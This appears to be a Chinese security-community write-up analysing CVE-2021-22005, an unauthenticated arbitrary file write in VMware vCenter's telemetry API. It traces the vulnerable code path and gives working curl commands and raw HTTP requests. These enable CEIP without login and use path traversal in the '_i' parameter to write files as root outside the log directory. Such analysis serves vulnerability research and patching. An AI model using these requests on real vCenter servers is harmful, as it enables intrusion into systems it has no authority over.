> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/10524#toc-0)

> 先知社区，先知安全技术社区

lz520520@深蓝攻防实验室

2021-09-21 补丁修复了如下一系列漏洞，其中 CVE-2021-22005 评分最高，可 getshell，网上也有该漏洞的 poc，所以接下来也对该漏洞做进一步分析。

```
CVE-2021-22005 vCenter Server 任意文件上传（CVSSv3评分9.8）
CVE-2021-21991：vCenter Server 本地提权漏洞（CVSSv3评分8.8）
CVE-2021-22006：vCenter Server 反向代理绕过漏洞（CVSSv3评分8.3）
CVE-2021-22011：vCenter Server未经身份验证的 API 端点漏洞（CVSSv3评分8.1）
CVE-2021-22015：vCenter Server 本地提权漏洞（CVSSv3评分7.8）
CVE-2021-22012：vCenter Server 未经身份验证的 API 信息泄露漏洞（CVSSv3评分7.5）
CVE-2021-22013：vCenter Server 路径遍历漏洞（CVSSv3评分7.5）
CVE-2021-22016：vCenter Server 反射型 XSS 漏洞（CVSSv3评分7.5）
CVE-2021-22017：vCenter Server rhttpproxy 绕过漏洞（CVSSv3评分7.3）
CVE-2021-22014：vCenter Server 身份验证代码执行漏洞（CVSSv3评分7.2）
CVE-2021-22018：vCenter Server 文件删除漏洞（CVSSv3评分6.5）
CVE-2021-21992：vCenter Server XML 解析拒绝服务漏洞（CVSSv3评分6.5）
CVE-2021-22007：vCenter Server 本地信息泄露漏洞（CVSSv3评分5.5）
CVE-2021-22019：vCenter Server 拒绝服务漏洞（CVSSv3评分5.3）
CVE-2021-22009：vCenter Server VAPI 拒绝服务漏洞（CVSSv3评分5.3）
CVE-2021-22010：vCenter Server VPXD 拒绝服务漏洞（CVSSv3评分5.3）
CVE-2021-22008：vCenter Server 信息泄露漏洞（CVSSv3评分5.3）
CVE-2021-22020：vCenter Server Analytics 服务拒绝服务漏洞（CVSSv3评分5.0）
CVE-2021-21993：vCenter Server SSRF 漏洞（CVSSv3评分4.3）
```

参考
--

任意文件上传  
[https://censys.io/blog/vmware-cve-2021-22005-technical-impact-analysis/](https://censys.io/blog/vmware-cve-2021-22005-technical-impact-analysis/)  
[https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/pocs/20210923_WEB_Vmware_vCenter_Server_FIleUpload_CVE-2021-20050.py](https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/pocs/20210923_WEB_Vmware_vCenter_Server_FIleUpload_CVE-2021-20050.py)  
[https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee](https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee)  
[https://mp.weixin.qq.com/s/gVsxziLqRQzb7QVOfyuBKw](https://mp.weixin.qq.com/s/gVsxziLqRQzb7QVOfyuBKw)  
[https://mp.weixin.qq.com/s/Jwp4GWKRO4H_AopqJSrBWw](https://mp.weixin.qq.com/s/Jwp4GWKRO4H_AopqJSrBWw)  
官方提供的测试脚本，算是一个漏洞扫描 + 临时补丁  
[https://kb.vmware.com/sfc/servlet.shepherd/version/download/0685G00000YTpbRQAT](https://kb.vmware.com/sfc/servlet.shepherd/version/download/0685G00000YTpbRQAT)  
根据提示漏洞接口应该如下

```
rep = requests.post(self.url + "/analytics/telemetry/ph/api/hyper/send?_c&_i=test",
                                headers={"Content-Type": "application/json"}, data="lorem ipsum")
/analytics/ph/api/dataapp/agent?_c=test&_i=1
/analytics/ph/api/dataapp/agent?action=collect&_c=test&_i=1
/analytics/telemetry/ph/api/hyper/send
/analytics/ph/api/dataapp/agent
```

vmware 公开的 poc

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211122230331-5b675ce8-4ba5-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211122230331-5b675ce8-4ba5-1.png)

```
curl -X POST "https://localhost/analytics/telemetry/ph/api/hyper/send?_c&_i=test" -d "Test_Workaround" -H "Content-Type: application/json"
# 实际接口
curl -X POST "http://localhost:15080/analytics/telemetry/ph/api/hyper/send?_c&_i=test" -d "Test_Workaround" -H "Content-Type: application/json"
# CEIP是否开启
curl -k -v "https://192.168.111.11/analytics/telemetry/ph/api/level?_c=test"
# 请求
curl -kv "https://192.168.111.11/analytics/telemetry/ph/api/hyper/send?_c=&_i=/stuff" -H "Content-Type: application/json" -d ""
# 创建一个json文件
/var/log/vmware/analytics/prod/_c_i/stuff.json
# 目录遍历
curl -kv "https://192.168.111.11/analytics/telemetry/ph/api/hyper/send?_c=&_i=/../../../../../../tmp/foo" -H "Content-Type: application/json" -d "contents here will be directly written to /tmp/foo.json as root"
curl -X POST "http://localhost:15080/analytics/telemetry/ph/api/hyper/send?_c&_i=test" -d "Test_Workaround" -H "Content-Type: application/json" -v 2>&1 | grep HTTP


```

影响范围
----

```
vCenter Server 7.0 < 7.0 U2c
vCenter Server 6.7 < 6.7 U3o
Cloud Foundation (vCenter Server) 4.x < KB85718 (4.3)
Cloud Foundation (vCenter Server) 3.x < KB85719 (3.10.2.2)
6.7 Windows 不受影响

```

漏洞分析
----

### TelemetryLevelBasedTelemetryServiceWrapper 请求入口

根据 poc 提示接口 / analytics/telemetry/ph/api/hyper/send，找到对应的类

```
analytics-push-telemetry-server-6.7.0.jar#com.vmware.ph.phservice.push.telemetry.server.AsyncTelemetryController.class

```

这个类是 springboot 的 controller，找到漏洞 URI，可以看到提交的两个参数`_c`和`_i`对应的是 collectorId 和 collectorInstanceId  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945790900-b5cab17f-7b27-4a6e-a83c-34eb514ff8d8.png#id=VOV29&originHeight=1111&originWidth=3011&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945790900-b5cab17f-7b27-4a6e-a83c-34eb514ff8d8.png#id=VOV29&originHeight=1111&originWidth=3011&originalType=binary&ratio=1&status=done&style=none)  
继续跟踪到`TelemetryLevelBasedTelemetryServiceWrapper#processTelemetry`  
`TelemetryLevelBasedTelemetryServiceWrapper`是在`AsyncTelemetryServiceWrapper$TelemetryRequestProcessorRunnable`类里调用，这个类是 Runnable 实现类，用于多线程调用，所以通过该类的 run 方法进一步跟踪到`processTelemetry`的。  
生成一个 Telemetrylevel 对象，TelemetryLevel 是一个枚举类型，这里会判断`TelemetryLevel.OFF`是否不等，继续看一下 OFF 是怎么设置的

```
public enum TelemetryLevel {
    OFF,
    BASIC,
    FULL;
    private TelemetryLevel() {
    }
}


```

[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945791084-7d3a8a55-7033-4b7e-ab3f-4a5b58fa9c0f.png#id=Wj3Wx&originHeight=872&originWidth=2949&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945791084-7d3a8a55-7033-4b7e-ab3f-4a5b58fa9c0f.png#id=Wj3Wx&originHeight=872&originWidth=2949&originalType=binary&ratio=1&status=done&style=none)  
调用堆栈

```
processTelemetry:44, TelemetryLevelBasedTelemetryServiceWrapper (com.vmware.ph.phservice.push.telemetry)
run:66, AsyncTelemetryServiceWrapper$TelemetryRequestProcessorRunnable (com.vmware.ph.phservice.push.telemetry.internal.impl)
call:511, Executors$RunnableAdapter (java.util.concurrent)
run:266, FutureTask (java.util.concurrent)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:748, Thread (java.lang)

```

[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945791255-6717e31d-2c4d-48bf-b401-c9ea4b6a290b.png#id=tMW1W&originHeight=458&originWidth=1889&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945791255-6717e31d-2c4d-48bf-b401-c9ea4b6a290b.png#id=tMW1W&originHeight=458&originWidth=1889&originalType=binary&ratio=1&status=done&style=none)

### ceip

#### getTelemetryLevel

```
getTelemetryLevel:56, DefaultTelemetryLevelService (com.vmware.ph.phservice.push.telemetry)
processTelemetry:40, TelemetryLevelBasedTelemetryServiceWrapper (com.vmware.ph.phservice.push.telemetry)
run:66, AsyncTelemetryServiceWrapper$TelemetryRequestProcessorRunnable (com.vmware.ph.phservice.push.telemetry.internal.impl)
call:511, Executors$RunnableAdapter (java.util.concurrent)
run:266, FutureTask (java.util.concurrent)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:748, Thread (java.lang)、

```

[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945791381-7da93d89-33a8-4137-b523-b8d4188c8bb0.png#id=R53Eq&originHeight=447&originWidth=1859&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945791381-7da93d89-33a8-4137-b523-b8d4188c8bb0.png#id=R53Eq&originHeight=447&originWidth=1859&originalType=binary&ratio=1&status=done&style=none)  
`this._telemetryLevelService.getTelemetryLevel`定位到如下，可以看到这里会判断 ceip（Customer Experience Improvement Program）是否开启  
DefaultTelemetryLevelService  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945791504-ab740892-5a44-4f25-986a-dbb6125637df.png#id=AKNGB&originHeight=1116&originWidth=2886&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945791504-ab740892-5a44-4f25-986a-dbb6125637df.png#id=AKNGB&originHeight=1116&originWidth=2886&originalType=binary&ratio=1&status=done&style=none)  
其实 ceip 是客户体验提升计划，不一定开启。点击加入开启后，其实对提交的`_C`是有要求的  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945791708-5179ec4d-9add-4325-804b-9e40f0f05d0b.png#id=y5jW2&originHeight=1582&originWidth=2669&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945791708-5179ec4d-9add-4325-804b-9e40f0f05d0b.png#id=y5jW2&originHeight=1582&originWidth=2669&originalType=binary&ratio=1&status=done&style=none)  
如下`_C`为 111 返回还是 off，所以参数有要求的  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945791886-f5222ac0-1da4-4902-b450-142322c5a5bd.png#id=R18mw&originHeight=653&originWidth=2114&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945791886-f5222ac0-1da4-4902-b450-142322c5a5bd.png#id=R18mw&originHeight=653&originWidth=2114&originalType=binary&ratio=1&status=done&style=none)  
查看漏洞利用目录`/var/log/vmware/analytics/prod`下有一个 json 文件  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945791990-6effc97d-ceb6-486c-9e7e-e7cfae04471b.png#id=Av9g9&originHeight=215&originWidth=2347&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945791990-6effc97d-ceb6-486c-9e7e-e7cfae04471b.png#id=Av9g9&originHeight=215&originWidth=2347&originalType=binary&ratio=1&status=done&style=none)  
其实是如此拼接成的，所以

```
_c + vSphere.vapi.6_7 + _i + 9D36C850-1612-4EC4-B8DD-50BA239A25BB.json

```

再次测试可发现返回 FULL 了  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945792091-4cc5894f-0c59-4794-a47d-9da1cfab3294.png#id=nOn0U&originHeight=746&originWidth=2103&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945792091-4cc5894f-0c59-4794-a47d-9da1cfab3294.png#id=nOn0U&originHeight=746&originWidth=2103&originalType=binary&ratio=1&status=done&style=none)  
或者通过该接口请求测试是否正常，这个请求会生成 ceip 缓存，后续请求就不会再发送 ceip 到 vmware 了。

```
curl -k -v "https://192.168.111.11/analytics/telemetry/ph/api/level?_c=vSphere.vapi.6_7"


```

这里再继续分析下 getTelemetryLevel，他会先判断 ceip 是否开启，如果没开启，则直接返回`OFF`，如果为 true，则进行判断。  
这里有个变量`this._collectorToTelemetryLevelCache`来存储 collectorAgent 对象（基于`_c`和`_i`生成），如果缓存里有了，就不会再次发遥测请求，_collectorToTelemetryLevelCache 在这里是 SimpleTimeBasedCacheImpl 类，内部实际存储 collectorAgent 是用的 hashmap。  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945792185-29e18c6b-e728-4339-8840-c09808a12386.png#id=PQjxq&originHeight=1536&originWidth=3208&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945792185-29e18c6b-e728-4339-8840-c09808a12386.png#id=PQjxq&originHeight=1536&originWidth=3208&originalType=binary&ratio=1&status=done&style=none)  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945792422-8de75b76-ac19-4e9b-9497-c6aa0ef1e7a0.png#id=MUIqU&originHeight=820&originWidth=1559&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945792422-8de75b76-ac19-4e9b-9497-c6aa0ef1e7a0.png#id=MUIqU&originHeight=820&originWidth=1559&originalType=binary&ratio=1&status=done&style=none)  
这里通过 get 获取 key（即 collectorAgent），所以看看 hashCode 怎么实现的。  
其实可以看到和`_collectorId`和`_collectorInstanceId`都相关。

```
public int hashCode() {
        int hash = this._collectorId.hashCode();
        if (this._collectorInstanceId != null) {
            hash = hash * 31 + this._collectorInstanceId.hashCode();
        }
        return hash;
    }


```

做个测试，`_c`和`_i`，如下就是不同缓存

```
CollectorAgent c1 = new CollectorAgent("vSphere.vapi.6_7", "c1");
CollectorAgent c2 = new CollectorAgent("vSphere.vapi.6_7", "c2");
this._collectorToTelemetryLevelCache.put(c1, telemetryLevel);
this._collectorToTelemetryLevelCache.get(c2);

```

[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945792577-cdb1218f-bb92-4713-8371-341026c92d2f.png#id=KQ65Q&originHeight=1034&originWidth=1768&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945792577-cdb1218f-bb92-4713-8371-341026c92d2f.png#id=KQ65Q&originHeight=1034&originWidth=1768&originalType=binary&ratio=1&status=done&style=none)

#### getTelemetryLevelFromManifest

```
getTelemetryLevelFromManifest:82, DefaultTelemetryLevelService (com.vmware.ph.phservice.push.telemetry)
getTelemetryLevel:69, DefaultTelemetryLevelService (com.vmware.ph.phservice.push.telemetry)
processTelemetry:40, TelemetryLevelBasedTelemetryServiceWrapper (com.vmware.ph.phservice.push.telemetry)
run:66, AsyncTelemetryServiceWrapper$TelemetryRequestProcessorRunnable (com.vmware.ph.phservice.push.telemetry.internal.impl)
call:511, Executors$RunnableAdapter (java.util.concurrent)
run:266, FutureTask (java.util.concurrent)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:748, Thread (java.lang)

```

[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945792685-230906b8-efc7-41f6-903a-831a3600c535.png#id=O9ipq&originHeight=576&originWidth=1859&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945792685-230906b8-efc7-41f6-903a-831a3600c535.png#id=O9ipq&originHeight=576&originWidth=1859&originalType=binary&ratio=1&status=done&style=none)  
那么再看看 DefaultTelemetryLevelService#getTelemetryLevelFromManifest 怎么发送遥测请求的，代码如下  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945792895-ff917aff-dedf-484c-8e19-8a98652ae505.png#id=UUgfm&originHeight=1308&originWidth=3203&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945792895-ff917aff-dedf-484c-8e19-8a98652ae505.png#id=UUgfm&originHeight=1308&originWidth=3203&originalType=binary&ratio=1&status=done&style=none)  
manifestContentProvider.getManifestContent 请求返回有以下几种情况

1.  collectorId 和 collectorInstanceId 随机，抛出异常，INVALID_COLLECTOR_ERROR, 这里提示 collectors ID 不在白名单内

[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945793113-2adfdbe7-3780-45d7-836d-92274ea83a3e.png#id=Hxevl&originHeight=857&originWidth=2235&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945793113-2adfdbe7-3780-45d7-836d-92274ea83a3e.png#id=Hxevl&originHeight=857&originWidth=2235&originalType=binary&ratio=1&status=done&style=none)

1.  collectorId 为 vSphere.vapi.6_7，抛出异常，GENERAL_ERROR，404

[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945793254-9d4f7849-87c5-4d62-83db-72b182ac29c3.png#id=t2VP7&originHeight=1128&originWidth=2308&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945793254-9d4f7849-87c5-4d62-83db-72b182ac29c3.png#id=t2VP7&originHeight=1128&originWidth=2308&originalType=binary&ratio=1&status=done&style=none)

1.  再第一次请求后，如果修改参数`_i`(collectorInstanceId)，后续二次请求都会报这个错

[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945793459-ff2080c3-1aeb-462f-8b69-02a19504ab66.png#id=IHPl0&originHeight=1297&originWidth=2266&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945793459-ff2080c3-1aeb-462f-8b69-02a19504ab66.png#id=IHPl0&originHeight=1297&originWidth=2266&originalType=binary&ratio=1&status=done&style=none)  
上面请求最终跟踪到如下位置 com.vmware.ph.upload.rest.PhRestClientImpl#getManifest，GET 请求  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945793680-72fc9241-9cf9-4c2a-8525-1c96f77abf2b.png#id=Q4wS1&originHeight=1210&originWidth=3157&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945793680-72fc9241-9cf9-4c2a-8525-1c96f77abf2b.png#id=Q4wS1&originHeight=1210&originWidth=3157&originalType=binary&ratio=1&status=done&style=none)  
手动发送，和之前获取的确实一样。  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945793848-3f056f1f-dff8-4527-ba31-c5d9254d0ae9.png#id=VLWRM&originHeight=410&originWidth=3324&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945793848-3f056f1f-dff8-4527-ba31-c5d9254d0ae9.png#id=VLWRM&originHeight=410&originWidth=3324&originalType=binary&ratio=1&status=done&style=none)  
有效请求  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945793988-192c6e8f-b4e2-4da6-891c-dde29fffd992.png#id=zE6Pk&originHeight=1864&originWidth=2775&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945793988-192c6e8f-b4e2-4da6-891c-dde29fffd992.png#id=zE6Pk&originHeight=1864&originWidth=2775&originalType=binary&ratio=1&status=done&style=none)  
PS: 这里在处理返回数据，会调用 json 进行反序列化，转换成 com.vmware.ph.model.exceptions.ServiceException  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945794246-66ff21bb-6831-4282-8f31-caf0f9765c97.png#id=rlVBt&originHeight=1247&originWidth=3198&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945794246-66ff21bb-6831-4282-8f31-caf0f9765c97.png#id=rlVBt&originHeight=1247&originWidth=3198&originalType=binary&ratio=1&status=done&style=none)  
`DefaultTelemetryLevelService#getTelemetryLevelFromManifest`，我们看下抛出异常后再次调用`getTelemetryLevelForFailedManifestRetrieval`，如果异常是`INVALID_COLLECTOR_ERROR`，那么直接返回 OFF，如果不是就返回 FULL，defaultTelemetryLevel 初始化的时候为 FULL。  
所以如果首次请求的 collectorId 不对，那么即时开了 ceip 也是无法利用成功，但第二次还是可以成功，所以网上一些分析文章 collectorId 随机也是可以用的，但如果之前没有发送过遥测请求，就会利用失败，所以建议 collectorId 还是设置一个有效的。  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945794493-8a0fcb25-dcc3-41a6-a33a-35ed813dcc65.png#id=eQpeX&originHeight=941&originWidth=3222&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945794493-8a0fcb25-dcc3-41a6-a33a-35ed813dcc65.png#id=eQpeX&originHeight=941&originWidth=3222&originalType=binary&ratio=1&status=done&style=none)

#### 开启 ceip

经过测试，开启 CEIP 的接口无认证要求，可未授权访问

```
curl -kv -X PUT "https://192.168.111.11/ui/ceip-ui/ctrl/ceip/status/true" -d "{}" -H "Content-Type: application/json"


```

PS: 但上面这个测试如果系统启动后没有登录过，请求不会成功  
调试发现，虽然接口请求不需要认证，但修改操作仍然需要 session，只有在有人登录过，这个未授权请求才能生效。  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945794686-6c498695-1861-41b4-b85e-b82c797ce257.png#id=xhD8I&originHeight=925&originWidth=1884&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945794686-6c498695-1861-41b4-b85e-b82c797ce257.png#id=xhD8I&originHeight=925&originWidth=1884&originalType=binary&ratio=1&status=done&style=none)  
该请求对应的类在`./plugin-packages/telemetry/plugins/h5-ceip.war`  
com.vmware.vsphere.client.h5.ceip.controller.CeipController  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945794811-cb49e1b1-e905-460b-b0e7-33e7d5242b96.png#id=RRhsi&originHeight=2019&originWidth=2600&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945794811-cb49e1b1-e905-460b-b0e7-33e7d5242b96.png#id=RRhsi&originHeight=2019&originWidth=2600&originalType=binary&ratio=1&status=done&style=none)  
还有其他两个接口

```
GET /ui/ceip-ui/ctrl/ceip/status
GET /ui/ceip-ui/ctrl/ceip/isAuthorized"

```

### LogTelemetryService

所以看来 CEIP 没有比较好的方案开启了。

```
processTelemetry:56, LogTelemetryService (com.vmware.ph.phservice.push.telemetry)
processTelemetry:45, TelemetryLevelBasedTelemetryServiceWrapper (com.vmware.ph.phservice.push.telemetry)
run:66, AsyncTelemetryServiceWrapper$TelemetryRequestProcessorRunnable (com.vmware.ph.phservice.push.telemetry.internal.impl)
call:511, Executors$RunnableAdapter (java.util.concurrent)
run:266, FutureTask (java.util.concurrent)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:748, Thread (java.lang)


```

[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945794983-4ccae6e8-5c6d-4465-90a4-5aa9540314dc.png#id=Y3C4O&originHeight=589&originWidth=1871&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945794983-4ccae6e8-5c6d-4465-90a4-5aa9540314dc.png#id=Y3C4O&originHeight=589&originWidth=1871&originalType=binary&ratio=1&status=done&style=none)  
当 ceip 开启，继续跟踪到`com/vmware/ph/phservice/push/telemetry/LogTelemetryService#processTelemetry`，  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945795102-951d99d0-b5fa-42ca-b45c-4f6f6113dccb.png#id=JMg2C&originHeight=1054&originWidth=3147&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945795102-951d99d0-b5fa-42ca-b45c-4f6f6113dccb.png#id=JMg2C&originHeight=1054&originWidth=3147&originalType=binary&ratio=1&status=done&style=none)  
日志目录是`/var/log/vmware/analytics/prod`  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945795281-41c8d87c-e005-4eec-b081-2c6e3cfb490e.png#id=MVXgA&originHeight=1035&originWidth=2752&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945795281-41c8d87c-e005-4eec-b081-2c6e3cfb490e.png#id=MVXgA&originHeight=1035&originWidth=2752&originalType=binary&ratio=1&status=done&style=none)  
日志文件名则是，可以看到

```
_c%1$s_i%2$s

```

[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945795418-b5a8c1f2-587f-4ebe-8cdc-46ffb4f7489b.png#id=lLHHr&originHeight=303&originWidth=2420&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945795418-b5a8c1f2-587f-4ebe-8cdc-46ffb4f7489b.png#id=lLHHr&originHeight=303&originWidth=2420&originalType=binary&ratio=1&status=done&style=none)  
继续往下就是日志记录，`this._logger`可以看到日志路径，而`serializeToLogMessage(telemetryRequest)`就是 POST 请求的 body 数据  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945795509-be55ab96-731f-48e1-88a4-07441eafb2c6.png#id=iynuy&originHeight=841&originWidth=3164&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945795509-be55ab96-731f-48e1-88a4-07441eafb2c6.png#id=iynuy&originHeight=841&originWidth=3164&originalType=binary&ratio=1&status=done&style=none)  
那么当请求参数`_c=vSphere.vapi.6_7&_i=/../../../../../../tmp/foo`  
则拼接为`/var/log/vmware/analytics/prod/_cvSphere.vapi.6_7_i/../../../../../../tmp/foo.json`  
但如果_cvSphere.vapi.6_7_i 不存在，则会目录遍历失败，这个是 linux 的问题，所以必须先请求一次`_c=vSphere.vapi.6_7&_i=/temp`,log4j 会创建目录，然后再请求上面 URL，实现目录遍历。  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945795673-e6cf424e-75f7-4b08-ba0f-a9195f646e27.png#id=aG0Pa&originHeight=568&originWidth=2861&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945795673-e6cf424e-75f7-4b08-ba0f-a9195f646e27.png#id=aG0Pa&originHeight=568&originWidth=2861&originalType=binary&ratio=1&status=done&style=none)  
PS: prod 目录默认也是没有的，vcenter 自身正常会创建这个 prod 目录，但 ceip 没开启之前，是没有的，所以建议也请求下正常的参数。  
创建 prod 目录

```
POST /analytics/telemetry/ph/api/hyper/send?_c=vSphere.vapi.6_7&_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB HTTP/1.1
Host: 192.168.111.11
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/json
X-Deployment-Secret: abc
Content-Length: 3
{}


```

创建_cvSphere.vapi.6_7_i 目录

```
POST /analytics/telemetry/ph/api/hyper/send?_c=vSphere.vapi.6_7&_i=/temp HTTP/1.1
Host: 192.168.111.11
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/json
X-Deployment-Secret: abc
Content-Length: 3
{}


```

由于后缀只能是 json，所以无法直接写文件，那么可以写到一个可执行文件内容的路径，这个大家就自行发挥想象力找找 linux 上可执行的方法了。

```
POST /analytics/telemetry/ph/api/hyper/send?_c=vSphere.vapi.6_7&_i=/../../../../../../tmp/test HTTP/1.1
Host: 192.168.111.11
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/json
X-Deployment-Secret: abc
Content-Length: 4
test


```

### 整理思路

1.  AsyncTelemetryController 是 / analytics/telemetry/ph/api/hyper/send 请求处理入口，接收`_c`和`_i`参数
2.  调用 TelemetryLevelBasedTelemetryServiceWrapper#processTelemetry 发起 ceip 遥测请求，，成功后进一步处理`_c`和`_i`
3.  processTelemetry 里调用`this._telemetryLevelService.getTelemetryLevel`来判断 ceip 遥测请求是否正常，这里也会传入`_c`和`_i`，如果开启成功可获取一个 FULL 值，除了需要开启 ceip，还会对 vmware 的一个 API 接口发送请求，，需要注意的一点，如果之前没发起遥测请求，则对_c 参数有要求，必须是一个合法的值，如果已经请求过，后续因为有缓存，不会再请求，则可成功通过校验。
4.  如果 ceip 未开启，可通过 / ui/ceip-ui/ctrl/ceip/status/true 开启，但 vcenter 之前需要有人已经登录过一次，否则会出现接口未认证的报错。
5.  ceip 请求成功后，processTelemetry 接着调用 LogTelemetryService#processTelemetry 来解析`_c`和`_i`，log4j 通过`_c$s_i$s`格式拼接日志路径，_i 设置成如 /../../../../../../tmp/test 即可导致任意路径遍历写入文件，当`_c=vSphere.vapi.6_7&_i=/../../../../../../tmp/test`最终路径拼接如`/var/log/vmware/analytics/prod/_cvSphere.vapi.6_7_i/../../../../../../tmp/foo.json`，这里需要注意的是 linux 上目录遍历时需要遍历前的上级目录存在才可遍历。

验证
--

返回 201 表示漏洞存在

```
POST /analytics/telemetry/ph/api/hyper/send?_c=vSphere.vapi.6_7&_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB HTTP/1.1
Host: 192.168.111.11
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Content-Length: 11
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
lorem ipsum


```

利用
--

第一步判断 ceip

```
# 修改ceip
curl -kv -X PUT "https://192.168.111.11/ui/ceip-ui/ctrl/ceip/status/true" -d "{}" -H "Content-Type: application/json"
# 判断ceip是否启动
curl -k -v "https://192.168.111.11/analytics/telemetry/ph/api/level?_c=vSphere.vapi.6_7"


```

